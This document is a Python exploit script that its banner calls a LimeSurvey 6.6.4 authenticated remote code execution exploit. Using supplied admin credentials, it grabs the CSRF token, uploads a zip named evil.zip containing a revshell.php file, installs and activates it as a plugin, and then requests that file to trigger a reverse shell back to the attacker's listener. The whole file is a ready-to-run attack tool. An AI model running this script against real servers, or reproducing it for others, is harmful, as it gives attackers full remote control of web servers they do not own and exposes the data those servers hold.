#!/usr/bin/env python3

# Author TheRedP4nther

from termcolor import colored
from pyfiglet import Figlet
from zipfile import ZipFile 
import urllib.parse
import argparse
import requests
import signal
import time
import sys
import os
import re

# Global Variables
survey_login = "index.php/admin/authentication/sa/login"
survey_upload = "index.php/admin/pluginmanager/sa/upload"
survey_install = "index.php/admin/pluginmanager?sa=installUploadedPlugin"
survey_scan = "index.php/admin/pluginmanager?sa=scanFiles"
survey_plugin_list = "index.php/admin/pluginmanager/index"
survey_activate = "index.php/admin/pluginmanager?sa=activate"
survey_reverse_shell = "upload/plugins/evil/revshell.php"

def def_handler(sig, frame):
    print(colored("\n\n[!] Leaving the program...\n", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def printBanner():
    f = Figlet(font='slant')
    banner = f.renderText('TheRedP4nther')
    print(colored(banner, 'red'))
    print(colored("    LimeSurvey 6.6.4 Authenticated RCE Exploit\n", "white"))

def getArgs():
    parser = argparse.ArgumentParser(description="LimeSurvey 6.6.4 Authenticated Remote Code Execution")
    parser.add_argument("-t", "--target", dest="target", required=True, help="Introduce the LimeSurvey base URL. (Ex: -t http://limesurvey.com)")
    parser.add_argument("-u", "--username", dest="username", required=True, help="Introduce LimeSurvey username. (Ex: -u ralph)")
    parser.add_argument("-p", "--password", dest="password", required=True, help="Introduce LimeSurvey password. (Ex: -p Str0ngP@ss123)")
    options = parser.parse_args()

    return options.target, options.username, options.password

def validateURL(url):
    if not url.endswith("/"):
        url += "/"

    try:
        r = requests.get(url, timeout=3)
        if r.status_code != 200:
            print(colored(f"\n[!] URL with not valid status code: {r.status_code}\n", "red"))
            sys.exit(1)
        
    except requests.exceptions.RequestException:
        print(colored("\n[!] The LimeSurvey URL is not active!\n", "red"))
        sys.exit(1)

    return url

def createZip():
    if os.path.exists("./config.xml") and os.path.exists("./revshell.php"):
        pass
    else:
        print(colored("\n[!] Missing required files: config.xml and/or revshell.php not found in the current directory!.\n", "red"))
        sys.exit(1)
        
    with ZipFile("./evil.zip", "w") as f:
        f.write("config.xml")
        f.write("revshell.php")

def get_pluginID(html):
    plugins_ids = re.findall(r'<tr data-id="(\d+)"', html)
    plugin_id = max(map(int, plugins_ids))   

    return plugin_id

def runExploit(url, username, password):
    session = requests.Session()

    print(colored("\n[CSRF TOKEN]:", "cyan"))
    print(colored("\n[+] Trying to obtain the CSRF Token...", "white"))

    try:
        r = session.get(url+survey_login, timeout=3)
        response = session.cookies.get_dict()

        csrf_token = None

        for key,value in response.items():
            if key == "YII_CSRF_TOKEN":
                csrf_token = urllib.parse.unquote(value)

        if not csrf_token:
            print(colored("\n[!] Failed to obtain the CSRF Token!\n", "red"))
            sys.exit(1)

        print(colored("[+] The CSRF Token has been obtained successfully.", "white"))

    except requests.exceptions.RequestException:
        print(colored("\n[!] Failed to obtain the CSRF Token!\n", "red"))
        sys.exit(1)

    login_data = {
        "YII_CSRF_TOKEN": csrf_token,
        "authMethod": "Authdb",
        "user": username,
        "password": password,
        "loginlang": "default",
        "action": "login",
        "width": 1892,
        "login_submit": "login"
    }

    try:
        print(colored("\n[LOGIN]:", "cyan"))
        print(colored("\n[+] Login into LimeSurvey...", "white"))
        login_response = session.post(url+survey_login, data=login_data, timeout=3)

        if ">Incorrect username and/or password!<" in login_response.content.decode():
            print(colored("\n[!] Incorrect username or password!\n", "red"))
            sys.exit(1)
        
        elif ">You have exceeded the number of maximum login attempts. Please wait 10 minutes before trying again.<" in login_response.content.decode():
            print(colored("\n[!] The application exceeded the number of maximum login attempts, try again in 10 minutes!\n", "red"))
            sys.exit(1)

    except requests.exceptions.RequestException:
        print(colored("\n[!] Error in the login request!\n", "red"))
        sys.exit(1)

    print(colored(f"[+] Login successfully as {username}.", "white"))
    csrf_token = urllib.parse.unquote(session.cookies.get_dict().get("YII_CSRF_TOKEN", ""))
    
    if not csrf_token:
        print(colored("\n[!] Failed to obtain the Upload CSRF Token!\n", "red"))
        sys.exit(1)
   
    upload_data = {
        "YII_CSRF_TOKEN": csrf_token,
        "action": "templateupload"
    }

    install_data = {
        "YII_CSRF_TOKEN": csrf_token,
        "isUpdate": "false"
    }


    with open("evil.zip", "rb") as file:
        files = {
            "the_file": ("evil.zip", file, "application/zip")
        }

        try:
            print(colored("\n[PLUGIN]:", "cyan"))
            print(colored("\n[+] Uploading and installing the plugin...", "white"))
            upload_response = session.post(url+survey_upload, data=upload_data, files=files, timeout=3)
            install_response = session.post(url+survey_install, data=install_data, timeout=3)

        except requests.exceptions.RequestException:
            print(colored("\n[!] Error in the upload request!\n", "red"))
            sys.exit(1)

    print(colored("[+] Plugin uploaded and installed succesfully.", "white"))

    try:
        session.get(url+survey_scan, timeout=3)
        r = session.get(url+survey_plugin_list, timeout=3)
        plugin_id = get_pluginID(r.text)
        
        activate_data = {
            "YII_CSRF_TOKEN": csrf_token,
            "pluginId": plugin_id
        }
    
        print(colored("[+] Activating the plugin...", "white"))
        r = session.post(url+survey_activate, data=activate_data, timeout=3)

        if "Plugin was activated." in r.text:
            print(colored("[+] Plugin activated successfully.", "white"))

        print(colored("\n[REVERSE SHELL]:\n", "cyan"))

        try:
            print(colored("[+] Trying to execute the Reverse Shell", "white"))
            print(colored("[+] Reverse shell executed successfully, check your listener :D!", "white"))
            session.get(url+survey_reverse_shell)
        
        except requests.exceptions.RequestException:
            print(colored("\n[!] The reverse shell could not be founded!\n", "red"))
            sys.exit(1)

    except requests.exceptions.RequestException:
        print(colored("\n[!] Fail to obtain plugins list!\n", "red"))
        sys.exit(1)

def main():
    printBanner()
    url, username, password = getArgs()
    url = validateURL(url)
    createZip()
    runExploit(url, username, password)

if __name__ == '__main__':
    main()
